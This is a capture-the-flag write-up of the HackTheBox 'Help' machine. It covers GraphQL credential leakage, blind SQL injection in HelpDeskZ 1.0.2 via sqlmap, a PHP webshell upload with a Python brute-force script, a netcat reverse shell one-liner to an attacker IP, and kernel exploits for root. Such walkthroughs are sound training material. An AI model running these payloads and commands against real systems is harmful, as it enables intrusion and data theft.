---
title: HTB: Help
url: https://0xdf.gitlab.io/2019/06/08/htb-help.html
date: 2019-06-08T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-help, hackthebox, ctf, nmap, graphql, curl, crackstation, gobuster, helpdeskz, searchsploit, exploit-db, sqli, blindsqli, sqlmap, ssh, credentials, filter, php, webshell, exploit, cve-2017-16995, cve-2017-5899, oswe-like, oscp-like-v3
---

![Help-cover](https://0xdfimages.gitlab.io/img/help-cover.png)

Help was an easy box with some neat challenges. As far as I can tell, most people took the unintended route which allowed for skipping the initial section. I’ll either enumerate a GraphQL API to get credentials for a HelpDeskZ instance. I’ll use those creds to exploit an authenticated SQLi vulnerability and dump the database. In the database, I’ll find creds which work to ssh into the box. Alternatively, I can use an unauthenticated upload bypass in HelpDeskZ to upload a webshell and get a shell from there. For root, it’s kernel exploits.

## Box Info

| Name | [Help](https://hackthebox.com/machines/help)  [Help](https://hackthebox.com/machines/help) [Play on HackTheBox](https://hackthebox.com/machines/help) |
| --- | --- |
| Release Date | [19 Jan 2019](https://twitter.com/hackthebox_eu/status/1085837802493759493) |
| Retire Date | 08 Jun 2019 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Help |
| Radar Graph | Radar chart for Help |
| First Blood User | 01:19:45[buckley310 buckley310](https://app.hackthebox.com/users/40877) |
| First Blood Root | 02:10:02[m0noc m0noc](https://app.hackthebox.com/users/4365) |
| Creator | [cymtrick cymtrick](https://app.hackthebox.com/users/3079) |

## Recon

### nmap

As always, start out with `nmap` where I’ll find two http servers (80 and 3000) and ssh (22):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.121
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-24 12:37 EST
Nmap scan report for 10.10.10.121
Host is up (0.020s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 5.63 seconds

root@kali# nmap -sC -sV -p 22,80,3000 -oA nmap/scipts 10.10.10.121
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-24 14:30 EST
Nmap scan report for 10.10.10.121
Host is up (0.019s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.02 seconds

```

Both Apache and SSH versions point to Ubuntu 16.04 / Xenial.

### Web - TCP 3000

#### Site

This port hosts a HTTP API. On visiting the root, there’s a message about credentials with the correct query:

![1548364083033](https://0xdfimages.gitlab.io/img/1548364083033.png)

#### GraphQL

Looking at the response headers, I see it’s powered by Express:

```

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 81
ETag: W/"51-gr8XZ5dnsfHNaB2KgX/Gxm9yVZU"
Date: Mon, 03 Jun 2019 20:36:46 GMT
Connection: close

{"message":"Hi Shiv, To get access please find the credentials with given query"}

```

Looking around on Google led me to [GraphQL](https://graphql.org/), a query language designed for APIs. When I tried paths that didn’t exist, I got this message:

![1559595036447](https://0xdfimages.gitlab.io/img/1559595036447.png)

But when I tried `/graphql`, I got:

![1548364107606](https://0xdfimages.gitlab.io/img/1548364107606.png)

#### Enumerating GraphQL

[This article](https://graphql.org/learn/introspection/) is a useful guide to enumerating a GraphQL instance. PenTest Partners also has an [article that shows some queries](https://www.pentestpartners.com/security-blog/pwning-wordpress-graphql/). [This post](https://www.apollographql.com/blog/graphql/examples/4-simple-ways-to-call-a-graphql-api/) was useful to figure out how to interact with GraphQL with `curl`.

I’ll switch to `curl` here to hit the API. `-s` will silence the progress bar. `-H "Content-Type: application/json"` is necessary for the API to handle the json data. Then I’ll use `-d '{ "query": "[query]" }'` to send the query. Finally, I’ll use `jq` to pretty print the results.

First I’ll get the fields from the schema:

```

root@kali# curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { queryType { name, fields { name, description } } } }" }' | jq  -c .
{"data":{"__schema":{"queryType":{"name":"Query","fields":[{"name":"user","description":""}]}}}}

```

I’ll also get the types of User, String, etc:

```

root@kali# curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { types { name } } }" }' | jq -c .
{"data":{"__schema":{"types":[{"name":"Query"},{"name":"User"},{"name":"String"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"Boolean"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}

```

I’ll get the fields asscoaited with the User type:

```

root@kali# curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __type(name: \"User\") { name fields { name } } }" }' | jq .
{
  "data": {
    "__type": {
      "name": "User",
      "fields": [
        {
          "name": "username"
        },
        {
          "name": "password"
        }
      ]
    }
  }
}

```

I’ll try to get the values

```

root@kali# curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ User { username password } }" }' | jq  -c .
{"errors":[{"message":"Cannot query field \"User\" on type \"Query\". Did you mean \"user\"?","locations":[{"line":1,"column":3}]}]}

```

Not sure why that returned error, but it offered a suggestion:

```

root@kali# curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ user { username password } }" }' | jq .
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}

```

That’s clearly a hash, and [crackstation.net](https://crackstation.net/) breaks it instantly:

![1548503757698](https://0xdfimages.gitlab.io/img/1548503757698.png)

I now have the username of “helpme@helpme.com” with password “godhelpmeplz”.

### Web - TCP 80

#### Site

The site is just the Ubuntu Apache default page:

![1559596066790](https://0xdfimages.gitlab.io/img/1559596066790.png)

#### gobuster

`gobuster` gives me a new path, `/support`:

```

root@kali# gobuster -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.121/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/01/24 14:37:35 Starting gobuster
=====================================================
/support (Status: 301)
/javascript (Status: 301)
=====================================================
2019/01/24 14:39:01 Finished
=====================================================

```

#### HelpDeskZ

`/support` is an instance of [HelpDeskZ](https://github.com/evolutionscript/HelpDeskZ-1.0), and open source helpdesk software platform.

![1559596283299](https://0xdfimages.gitlab.io/img/1559596283299.png)

Peaking at the code in GitHub, I can see there’s a `readme.html` file in the webroot, and it shows up on target:

![1548364210144](https://0xdfimages.gitlab.io/img/1548364210144.png)

So it’s version 1.0.2 from 2015.

#### Login

I am able to log in using the creds from port 3000:

![1559596344204](https://0xdfimages.gitlab.io/img/1559596344204.png)

## Shell as help

### Find Exploit

`searchsploit` shows two exploits when I search for “helpdeskz”:

```

root@kali# searchsploit helpdeskz
---------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                      |  Path
                                                                                                    | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------------- ----------------------------------------
HelpDeskZ 1.0.2 - Arbitrary File Upload                                                             | exploits/php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download                      | exploits/php/webapps/41200.py
---------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

I actually used the first one to own this box originally, but given the existence of the creds from port 3000, I suspect the intended route was the SQLI Injection.

### Analysis

The exploit code didn’t just work out of the box for me. But in reading it, I could understand what it was doing. Basically, I needed to login and create a ticket. That ticket needed to have an attachment (I created an empty file named `hdz_0xdf.txt`). On submitting, I could see my ticket:

![1559687332620](https://0xdfimages.gitlab.io/img/1559687332620.png)

The link to the attachment is: `http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6`. If I visit that link, I get a download dialog:

![1559687423953](https://0xdfimages.gitlab.io/img/1559687423953.png)

The SQLi is in the last param. I can show by adding `and 1=1-- -` to the end of the url. Same download pop up. But if I add `and 1=2-- -` to the end of the url, I get:

![1559687507879](https://0xdfimages.gitlab.io/img/1559687507879.png)

That’s a blind injection. I can pass some test in, and get true (downloaded attachment) or false (Whoops!) back.

For example, `and (select (username) from staff limit 0,1) = 'admin'-- -` returns attachment, while `and (select (username) from staff limit 0,1) = '0xdf'-- -`returns Whoops!.

### sqlmap

I could script this up, but this seems like a good chance to let `sqlmap` dump the db. I’ll download the attachment through burp, and save the request to a file.

![1559764016188](https://0xdfimages.gitlab.io/img/1559764016188.png)

Then I can run:

```

root@kali# sqlmap -r ticket_attachment.request --level 5 --risk 3 -p param[]
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:33:15 /2019-06-04/

[17:33:15] [INFO] parsing HTTP request from 'ticket_attachment.request'
[17:33:15] [INFO] testing connection to the target URL
[17:33:15] [INFO] testing if the target URL content is stable
[17:33:16] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[17:33:16] [WARNING] heuristic (basic) test shows that GET parameter 'param[]' might not be injectable
[17:33:16] [INFO] testing for SQL injection on GET parameter 'param[]'
[17:33:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:33:17] [INFO] GET parameter 'param[]' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --not-string="go")
[17:33:19] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
...[snip]...
[17:33:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[17:33:38] [INFO] GET parameter 'param[]' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[17:33:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:33:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:33:38] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:33:39] [INFO] target URL appears to have 9 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[17:33:51] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[17:33:53] [INFO] target URL appears to be UNION injectable with 9 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
...[snip]...
[17:34:23] [INFO] checking if the injection point on GET parameter 'param[]' is a false positive
GET parameter 'param[]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 433 HTTP(s) requests:
---
Parameter: param[] (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 AND 6277=6277

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 AND SLEEP(5)
---
[17:34:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[17:34:29] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.121'

```

I’ve got the injection. Now I’ll run with `--dump`. One table that looks interesting is:

```

Database: support
Table: staff
[1 entry]
+----+-------+------------+--------------------+--------+--------+----------+---------------+----------+-----------------------------------------------------+--------------------------------+------------+--------------------+------------------------+                     
| id | admin | login      | email              | status | avatar | username | fullname      | timezone | password                                            | signature                      | last_login | department         | newticket_notification |                     
+----+-------+------------+--------------------+--------+--------+----------+---------------+----------+-----------------------------------------------------+--------------------------------+------------+--------------------+------------------------+                     
| 1  | 1     | 1547216217 | support@mysite.com | Enable | NULL   | admin    | Administrator | <blank>  | d318f44739dced66793b1a603028133a76ae680e (Welcome1) | Best regards,\r\nAdministrator | 1543429746 | a:1:{i:0;s:1:"1";} | 0                      |                     
+----+-------+------------+--------------------+--------+--------+----------+---------------+----------+-----------------------------------------------------+--------------------------------+------------+--------------------+------------------------+ 

```

Specifically the password hash which `sqlmap` was able to break as “Welcome1”.

### SSH

Knowing SSH was open, I tried to connect using a handful of names - “helpme”, “admin”, “root”, “help”. help worked:

```

root@kali# ssh help@10.10.10.121
help@10.10.10.121's password:
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Fri Jan 11 06:18:50 2019
help@help:~$

```

From there I could grab `user.txt`:

```

help@help:~$ cat user.txt 
bb8a7b36...

```

## Shell as help - Alternative

### Exploit

I’ll use the other exploit from `searchsploit`, HelpDeskZ 1.0.2 - Arbitrary File Upload - `40300.py`.

### Strategy

The vulnerability is that there’s a mistake in the filter for what kinds of files will upload, allowing php files despite the intention that they are blocked. To make use of I’ll need to be able to find the path to the file, which the GUI won’t show me. The script in `searchsploit` will brute force all the possible names until it finds it.

### Source Analysis

#### UPLOAD\_DIR

Before I can run the code, I need to know the upload path. Looking in the [code for helpdeskz](https://github.com/evolutionscript/HelpDeskZ-1.0), I see an attachment section:

```

if(!isset($error_msg) && $settings['ticket_attachment']==1){
    $uploaddir = UPLOAD_DIR.'tickets/';		
    if($_FILES['attachment']['error'] == 0){
        $ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
        $filename = md5($_FILES['attachment']['name'].time()).".".$ext;
        $fileuploaded[] = array('name' => $_FILES['attachment']['name'], 'enc' => $filename, 'size' => formatBytes($_FILES['attachment']['size']), 'filetype' => $_FILES['attachment']['type']);
        $uploadedfile = $uploaddir.$filename;

```

I can see the `$uploaddir` is set to `UPLOAD_DIR` + `/tickets`. I’ll clone the source locally, and search for the definition of `UPLOAD_DIR`:

```

root@kali:/opt/HelpDeskZ-1.0# grep -r "UPLOAD_DIR" . | grep define
./includes/pipe.php:define('UPLOAD_DIR','../uploads/');
./includes/global.php:define('UPLOAD_DIR', ROOTPATH . 'uploads/');

```

So uploads go to `/support/uploads/tickets`. I’ll check, and that path exists (though it 302 redirects back to root for both `/support/uploads` and `/support/uploads/tickets`). Still, non-existent paths return 404.

`gobuster` will show it as well:

```

root@kali# gobuster -u http://10.10.10.121/support -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.121/support/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/01/26 15:50:58 Starting gobuster
=====================================================
/images (Status: 301)
/uploads (Status: 301)
/css (Status: 301)
/includes (Status: 301)
/js (Status: 301)
/views (Status: 301)
/controllers (Status: 301)
=====================================================
2019/01/26 15:53:58 Finished
=====================================================

root@kali# gobuster -u http://10.10.10.121/support/uploads -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.121/support/uploads/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/01/26 16:45:41 Starting gobuster
=====================================================
/articles (Status: 301)
/tickets (Status: 301)
=====================================================
2019/01/26 16:48:41 Finished
=====================================================

```

#### Filename

I see the filename is also defined:

```

$filename = md5($_FILES['attachment']['name'].time()).".".$ext;

```

So the file will be named the md5 of the filename concatenated with the time, and then php will be put back on.

#### File Movement

Immediately after that, the following code moves the file to the temp location, and then (assuming that succeeds) calls `verifyAttachment`:

```

if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
    $show_step2 = true;
    $error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
}else{
    $fileverification = verifyAttachment($_FILES['attachment']);
    switch($fileverification['msg_code']){
        case '1':
            $show_step2 = true;
            $error_msg = $LANG['INVALID_FILE_EXTENSION'];
            break;
        case '2':
            $show_step2 = true;
            $error_msg = $LANG['FILE_NOT_ALLOWED'];
            break;
        case '3':
            $show_step2 = true;
            $error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);
            break;
    }
}

```

`verifyAttachment` can be found [here](https://raw.githubusercontent.com/evolutionscript/HelpDeskZ-1.0/master/includes/functions.php):

```

function verifyAttachment($filename){
    global $db;	
    $namepart = explode('.', $filename['name']);
    $totalparts = count($namepart)-1;
    $file_extension = $namepart[$totalparts];
    if(!ctype_alnum($file_extension)){
        $msg_code = 1;
    }else{
        $filetype = $db->fetchRow("SELECT count(id) AS total, size FROM ".TABLE_PREFIX."file_types WHERE type='".$db->real_escape_string($file_extension)."'");
        if($filetype['total'] == 0){
            $msg_code = 2;
        }elseif($filename['size'] > $filetype['size'] && $filetype['size'] > 0){
    	    $msg_code = 3;
            $misc = formatBytes($filetype['size']);
        }else{	
            $msg_code = 0;
        }
    }
    $data = array('msg_code' => $msg_code, 'msg_extra' => $misc);
    return $data;
}

```

A php file will fail, because it’s not in the allowed file types. And yet, there is no code that will delete the file. It stays in the temporary location. That is the vulnerability. If I can find that location, I can access the code. And that location only requires that I know the time.

### Upload Webshell

I can log in or not log in. Either way, I am able to create a new ticket. I’ll attach a simple php shell:

```

<?php system($_REQUEST['cmd']); ?>

```

![1559597565589](https://0xdfimages.gitlab.io/img/1559597565589.png)

The site will say it’s no good:

![1548529774550](https://0xdfimages.gitlab.io/img/1548529774550.png)

But I know the upload is there.

### Brute Upload Location

I’ll start with the script from `searchsploit`: https://www.exploit-db.com/exploits/40300

I know from the response headers that the time is off by several minutes. I’ll make a couple modifications to the script:

1) First, the script will only find php files. I’ll change it to find whatever ext I give it.

2) I’ll open up the brute force space. By default, it starts now and scans backwards 5 minutes. Since the box is about 8 minutes skewed, I’ll start 5 minutes ago, and go back up to 20 minutes from there.

```

#!/usr/bin/env python

import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time()) - 5*60
ext = fileName.split('.')[-1]

for x in range(0, 20*60):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()
    url = helpdeskzBaseUrl+md5hash+'.'+ext
    #print("checking " + url)
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"

```

When I run it, passing in the upload path I found in the source, it finds my shell:

```

root@kali# ./exploit.py http://10.10.10.121/support/uploads/tickets/ cmd.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
found!
http://10.10.10.121/support/uploads/tickets/30487f2924a0ae640ba2c0a54c9136f1.php

```

### Test WebShell

Now that I have a url, I’ll give it a spin:

```

root@kali# curl http://10.10.10.121/support/uploads/tickets/30487f2924a0ae640ba2c0a54c9136f1.php?cmd=id
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)

```

Nice!

### Interactive Shell

Go with the old standby:

```

root@kali# curl 'http://10.10.10.121/support/uploads/tickets/30487f2924a0ae640ba2c0a54c9136f1.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.4+443+>/tmp/f'

```

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.121.
Ncat: Connection from 10.10.10.121:50042.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)

```

Upgrade shell with standard trick (I don’t usually show this, but I always do it):

```

$ python -c 'import pty; pty.spawn("bash")'
help@help:/var/www/html/support/uploads/tickets$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo
root@kali# nc -lnvp 443    # i typed fg enter
                                                      reset
reset: unknown terminal type unknown
Terminal type? screen

```

Now I have a solid terminal with up arrow, tab completion, and ctrl-c:

```

help@help:/var/www/html/support/uploads/tickets$ id
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)

```

I can also grab user.txt:

```

help@help:/home/help$ cat user.txt
bb8a7b36...

```

## Priv: help –> root

### Enumeration

A simple `uname -a` shows the version of this host:

```

help@help:/var/www/html/support/uploads/tickets$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

```

Given that kernel is almost a year old, exploits might be in play. Googling found two exploits that might work:
- CVE-2017-16995 - [44298.c](https://www.exploit-db.com/exploits/44298) and [45010.c](https://www.exploit-db.com/exploits/45010)
- CVE-2017-5899 - [exploit.sh](https://github.com/bcoles/local-exploits/blob/master/CVE-2017-5899/exploit.sh)

### Exploit

I’ll download all three exploits, and serve them with `python3 -m http.server 80` to move them to Help with `wget`.

I’m working out of `/dev/shm`. I’ll compile and run the first, and get a root shell:

```

help@help:/dev/shm$ gcc -o a 44298.c 
help@help:/dev/shm$ ./a
task_struct = ffff880003596200
uidptr = ffff880003cfcc04
spawning root shell
root@help:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)

```

The second works as well:

```

help@help:/dev/shm$ gcc -o a 45010.c 
help@help:/dev/shm$ ./a
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff8800050ecb00
[*] Leaking sock struct from ffff88003b3e9000
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88000898bbc0
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88000898bbc0
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)

```

The third does the compilation in the shell script:

```

help@help:/dev/shm$ ./a.sh                                  
[~] Found privsep: /usr/lib/s-nail/s-nail-privsep                                                                             
[.] Compiling /var/tmp/.snail.so.c ...                      
[.] Compiling /var/tmp/.sh.c ...                            
[.] Compiling /var/tmp/.privget.c ...                               
[.] Adding /var/tmp/.snail.so to /etc/ld.so.preload ... 
[=] s-nail-privsep local root by @wapiflapi               
[.] Started flood in /etc/ld.so.preload                     
[.] Started race with /usr/lib/s-nail/s-nail-privsep     
[.] This could take a while...                            
[.] Race #1 of 1000 ...                               
This is a helper program of "s-nail" (in /usr/bin).     
  It is capable of gaining more privileges than "s-nail"              
  and will be used to create lock files.                  
  It's sole purpose is outsourcing of high privileges into                                                                    
  fewest lines of code in order to reduce attack surface.                                      
  It cannot be run by itself.                               
[.] Race #2 of 1000 ...
...[snip]...
[.] Race #296 of 1000 ...
This is a helper program of "s-nail" (in /usr/bin).
  It is capable of gaining more privileges than "s-nail"
  and will be used to create lock files.
  It's sole purpose is outsourcing of high privileges into
  fewest lines of code in order to reduce attack surface.
  It cannot be run by itself.
[.] Race #297 of 1000 ...
[+] got root! /var/tmp/.sh (uid=0 gid=0)
[.] Cleaning up...
[+] Success:
-rwsr-xr-x 1 root root 6336 Jun  3 15:09 /var/tmp/.sh
[.] Launching root shell: /var/tmp/.sh
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)

```

With any of these root shells, I can get `root.txt`:

```

root@help:/root# cat root.txt 
b7fe6082...

```